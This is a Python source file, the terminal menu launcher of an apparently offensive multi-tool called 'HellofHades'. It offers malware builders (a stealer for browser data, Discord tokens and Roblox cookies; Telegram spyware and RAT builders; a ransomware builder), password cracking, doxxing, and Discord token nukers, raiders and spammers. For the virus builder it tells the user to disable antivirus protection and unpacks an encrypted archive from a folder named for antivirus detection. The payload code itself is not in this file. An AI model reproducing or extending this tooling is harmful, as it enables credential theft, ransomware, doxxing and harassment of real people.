from Program.Config.Config import *
from Program.Config.Util import *

try:
    import webbrowser
    import re
    import pyzipper
    from tkinter import messagebox
    import shutil
except Exception as e:
    ErrorModule(e)

# Definição das opções
option_01 = "Website-Vulnerability-Scanner"
option_02 = "Website-Info-Scanner"
option_03 = "Website-Url-Scanner"
option_04 = "Ip-Scanner"
option_05 = "Ip-Port-Scanner"
option_06 = "Ip-Pinger"
option_07 = "Soon"
option_08 = "Soon"
option_09 = "Soon"
option_10 = "Soon"

option_11 = "Dox-Create"
option_12 = "Dox-Tracker"
option_13 = "Get-Image-Exif"
option_14 = "Google-Dorking"
option_15 = "Username-Tracker"
option_16 = "Email-Tracker"
option_17 = "Email-Lookup"
option_18 = "Phone-Number-Lookup"
option_19 = "Ip-Lookup"
option_20 = "Soon"

option_21 = "clone-website"
option_22 = "Password-Zip-Cracked-Attack"
option_23 = "Password-Hash-Decrypted-Attack"
option_24 = "Password-Hash-Encrypted"
option_25 = "Search-In-DataBase"
option_26 = "Dark-Web-Links"
option_27 = "Ip-Generator"
option_28 = "Soon"
option_29 = "Soon"
option_30 = "Soon"

option_31 = "virus-builder"
option_32 = "Spyware-Telegram"
option_33 = "Telegram-Rat-Builder"
option_34 = "Ramsonware-Builder"
option_35 = "Proxy-Scraper"
option_36 = "Soon"
option_37 = "Soon"
option_38 = "Soon"
option_39 = "Soon"
option_40 = "Soon"

option_41 = "Roblox-Cookie-Login"
option_42 = "Roblox-Cookie-Info"
option_43 = "Roblox-Id-Info"
option_44 = "Roblox-User-Info"
option_45 = "Soon"
option_46 = "Soon"
option_47 = "Soon"
option_48 = "Soon"
option_49 = "Soon"
option_50 = "Soon"

option_51 = "Discord-Token-Nuker"
option_52 = "Discord-Token-Info"
option_53 = "Discord-Token-Joiner"
option_54 = "Discord-Token-Leaver"
option_55 = "Discord-Token-Login"
option_56 = "Discord-Token-To-Id-And-Brute"
option_57 = "Discord-Token-Server-Raid"
option_58 = "Discord-Token-Spammer"
option_59 = "Discord-Token-Delete-Friends"
option_60 = "Discord-Token-Block-Friends"
option_61 = "Discord-Token-Mass-Dm"
option_62 = "Discord-Token-Delete-Dm"
option_63 = "Discord-Token-Status-Changer"
option_64 = "Discord-Token-Language-Changer"
option_65 = "Discord-Token-House-Changer"
option_66 = "Discord-Token-Theme-Changer"
option_67 = "Discord-Token-Generator"
option_68 = "Discord-Bot-Server-Nuker"
option_69 = "Discord-Bot-Invite-To-Id"
option_70 = "Discord-Server-Info"
option_71 = "Discord-Nitro-Generator"
option_72 = "Discord-Webhook-Info"
option_73 = "Discord-Webhook-Delete"
option_74 = "Discord-Webhook-Spammer"
option_75 = "Discord-Webhook-Generator"
option_76 = "Soon"
option_77 = "Soon"
option_78 = "Soon"
option_79 = "Soon"

option_next = "Next"
option_back = "Back"
option_site = "Site"
option_info = "Info"

# Função para formatar opções
def format_option(num, text):
    num_str = str(num).zfill(2)
    return f"{red}[{white}{num_str}{red}]{white} " + text.ljust(30)[:30].replace("-", " ")

# Criação das opções formatadas
options_txt = {}
for i in range(1, 80):
    option_name = globals().get(f'option_{str(i).zfill(2)}', 'Soon')
    options_txt[str(i).zfill(2)] = format_option(i, option_name)

# Opções especiais
option_back_txt = option_back + f" {red}[{white}B{red}]{white}"
option_next_txt = option_next + f" {red}[{white}N{red}]{white}"
option_site_txt = f"{red}[{white}S{red}]{white} " + option_site
option_info_txt = f"{red}[{white}I{red}]{white} " + option_info

# Banner estático (não será mais recalculado)
BANNER_LINES = [
    "    ",
    " ██░ ██ ▓█████  ██▓     ██▓        ▒█████    █████▒    ██░ ██  ▄▄▄      ▓█████▄ ▓█████   ██████  ",
    "▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒       ▒██▒  ██▒▓██   ▒    ▓██░ ██▒▒████▄    ▒██▀ ██▌▓█   ▀ ▒██    ▒  ",
    "▒██▀▀██░▒███   ▒██░    ▒██░       ▒██░  ██▒▒████ ░    ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒███   ░ ▓██▄    ",
    "░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░       ▒██   ██░░▓█▒  ░    ░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄   ▒   ██▒ ",
    "░▓█▒░██▓░▒████▒░██████▒░██████▒   ░ ████▓▒░░▒█░       ░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░▒████▒▒██████▒▒ ",
    " ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░   ░ ▒░▒░▒░  ▒ ░        ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░ ",
    " ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░     ░ ▒ ▒░  ░          ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░ ",
    " ░  ░░ ░   ░     ░ ░     ░ ░      ░ ░ ░ ▒   ░ ░        ░  ░░ ░  ░   ▒    ░ ░  ░    ░   ░  ░  ░   ",
    " ░  ░  ░   ░  ░    ░  ░    ░  ░       ░ ░              ░  ░  ░      ░  ░   ░       ░  ░      ░   ",
    "                                                                         ░                      ",
]

def get_centered_banner():
    """Retorna o banner centralizado de forma estática"""
    try:
        term_width = shutil.get_terminal_size().columns
    except:
        term_width = 120
    
    centered_banner = []
    for line in BANNER_LINES:
        clean_line = line.rstrip()
        if clean_line.strip():
            padding = max(0, (term_width - len(clean_line)) // 2)
            centered_line = " " * padding + clean_line
            centered_banner.append(f"{red}{centered_line}{reset}")
        else:
            centered_banner.append("")
    
    return centered_banner

# Cache do banner centralizado
CENTERED_BANNER = get_centered_banner()

def Update():
    popup_version = ""
    try:
        new_version = re.search(r'version_tool\s*=\s*"([^"]+)"', requests.get(url_config).text).group(1)
        if new_version != version_tool:
            webbrowser.open(f"https://{github_tool}")
            colorama.init()
            input(f"{BEFORE + current_time_hour() + AFTER} {INFO} Please install the new version of the tool: {white + version_tool + red} -> {white + new_version} ")
            popup_version = f"{red}New Version: {white + version_tool + red} -> {white + new_version}"
            colorama.deinit()
            Clear()
    except:
        pass
    
    return popup_version

def create_menu(menu_number):
    """Cria o menu baseado no número do menu"""
    if menu_number == "1":
        return f""" ┌─ {option_info_txt}                                                                                               {option_next_txt} ─┐
 ├─ {option_site_txt} ┌─────────────────┐                        ┌───────┐                           ┌───────────┐            │
 └─┬─────────┤ Network Scanner ├─────────┬──────────────┤ Osint ├──────────────┬────────────┤ Utilities ├────────────┴─
   │         └─────────────────┘         │              └───────┘              │            └───────────┘
   ├─ {options_txt['01']}├─ {options_txt['11']}├─ {options_txt['21']}
   ├─ {options_txt['02']}├─ {options_txt['12']}├─ {options_txt['22']}
   ├─ {options_txt['03']}├─ {options_txt['13']}├─ {options_txt['23']}
   ├─ {options_txt['04']}├─ {options_txt['14']}├─ {options_txt['24']}
   ├─ {options_txt['05']}├─ {options_txt['15']}├─ {options_txt['25']}
   └─ {options_txt['06']}├─ {options_txt['16']}├─ {options_txt['26']}
                                         ├─ {options_txt['17']}└─ {options_txt['27']}
                                         ├─ {options_txt['18']}
                                         └─ {options_txt['19']}
"""
    elif menu_number == "2":
        return f""" ┌─ {option_info_txt}                                                                                                {option_next_txt} ─┐
 ├─ {option_site_txt}  ┌───────────────┐                         ┌──────┐                              ┌────────┐    {option_back_txt} ─┤
─┴─┬──────────┤ Virus Builder ├──────────┬──────────────┤ Util ├───────────────┬──────────────┤ Roblox ├──────────────┴─
   │          └───────────────┘          │              └──────┘               │              └────────┘
   └─ {options_txt['31']}├─ {options_txt['32']}├─ {options_txt['41']}
           ├─ Stealer                    ├─ {options_txt['33']}├─ {options_txt['42']}
           │  ├─ System Info             ├─ {options_txt['34']}├─ {options_txt['43']}
           │  ├─ Discord Token/Injection └─ {options_txt['35']}└─ {options_txt['44']}
           │  ├─ Browser Steal           
           │  ├─ Roblox Cookie                                     
           │  └─ Other                            
           └─ Malware                    
              ├─ Anti VM & Debug                                             
              ├─ Startup                                                    
              └─ Other                          
"""
    elif menu_number == "3":
        return f""" ┌─ {option_info_txt}                                                                                                {option_back_txt} ─┐
 ├─ {option_site_txt}                                           ┌─────────┐                                                    │
─┴─┬───────────────────────────────────────────────────┤ Discord ├────────────────────────────────────────────────────┘
   │                                                   └─────────┘                       
   ├─ {options_txt['51']}┌─ {options_txt['61']}┌─ {options_txt['71']}
   ├─ {options_txt['52']}├─ {options_txt['62']}├─ {options_txt['72']}
   ├─ {options_txt['53']}├─ {options_txt['63']}├─ {options_txt['73']}
   ├─ {options_txt['54']}├─ {options_txt['64']}├─ {options_txt['74']}
   ├─ {options_txt['55']}├─ {options_txt['65']}├─ {options_txt['75']}
   ├─ {options_txt['56']}├─ {options_txt['66']}│
   ├─ {options_txt['57']}├─ {options_txt['67']}│
   ├─ {options_txt['58']}├─ {options_txt['68']}│
   ├─ {options_txt['59']}├─ {options_txt['69']}│
   ├─ {options_txt['60']}├─ {options_txt['70']}│
   └─────────────────────────────────────┴─────────────────────────────────────┘
"""
    return ""

def Menu():
    popup_version = Update()
    
    try:
        with open(menu_path, "r") as file:
            menu_number = file.read().strip()
        if menu_number not in ["1", "2", "3"]:
            menu_number = "1"
    except:
        menu_number = "1"
    
    # Cria o menu baseado no número
    menu_content = create_menu(menu_number)
    
    # Combina banner e menu
    banner_with_menu = []
    banner_with_menu.append(popup_version)
    banner_with_menu.append("")
    banner_with_menu.append("")
    banner_with_menu.extend(CENTERED_BANNER)
    banner_with_menu.append("")
    banner_with_menu.append("                                           ")
    banner_with_menu.append(menu_content)
    
    # Retorna o banner completo e o número do menu
    return "\n".join(banner_with_menu), menu_number

menu_path = os.path.join(tool_path, "Program", "Config", "Menu.txt")

while True:
    try:
        Clear()
        
        banner, menu_number = Menu()
        
        Title(f"Menu {menu_number}")
        Slow(MainColor(banner))
        
        choice = input(MainColor(f""" ┌──({white}{username_pc}@HellofHades)─{red}[{white}~/{os_name}/Menu-{menu_number}]
 └─{white}$ {reset}"""))
        
        if choice in ['N', 'n', 'NEXT', 'Next', 'next']:
            menu_number = {"1": "2", "2": "3", "3": "1"}.get(menu_number, "1")
            with open(menu_path, "w") as file:
                file.write(menu_number)
            continue
        
        elif choice in ['B', 'b', 'BACK', 'Back', 'back']:
            if menu_number in ["2", "3"]:
                menu_number = {"2": "1", "3": "2"}.get(menu_number, "1")
                with open(menu_path, "w") as file:
                    file.write(menu_number)
            continue
        
        elif choice in ['I', 'i', 'INFO', 'Info', 'info']:
            StartProgram(f"{option_info}.py")
            continue
        
        elif choice in ['S', 's', 'SITE', 'Site', 'site']:
            StartProgram(f"{option_site}.py")
            continue
        
        elif choice == '31':
            if os_name == "Linux":
                print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
                messagebox.showinfo(f" {version_tool} - Virus Builder", "The builder virus is only compatible with Windows, under Linux it can encounter big problems.")
            
            print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
            messagebox.showinfo(f" {version_tool} - Virus Builder", "It is important to disable your antivirus (Real-time Protection) before building, so that no files are deleted.")
            try:
                zip_file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "VirusBuilderOptions.zip")
                file_path = os.path.join(tool_path, "Program", "FileDetectedByAntivirus", "VirusBuilderOptions.py")
                output = os.path.join(tool_path, "Program", "FileDetectedByAntivirus")
                if not os.path.exists(file_path):
                    if os.path.exists(zip_file_path):
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Decompression of the encrypted file: {white}Program\\FileDetectedByAntivirus\\VirusBuilderOptions.zip")
                        with pyzipper.AESZipFile(zip_file_path) as zf:
                            zf.pwd = b''
                            zf.extractall(output)
                        time.sleep(3)
                    else:
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Files are missing, please reinstall the tool.")
            except Exception as e:
                Error(e)
        
        # Dicionário de opções
        options = {}
        for i in range(1, 80):
            key = str(i).zfill(2)
            option_name = globals().get(f'option_{key}', 'Soon')
            options[key] = option_name
        
        if choice in options:
            StartProgram(f"{options[choice]}.py")
        elif '0' + choice in options:
            StartProgram(f"{options['0' + choice]}.py")
        else:
            ErrorChoiceStart()
    
    except Exception as e:
        Error(e)
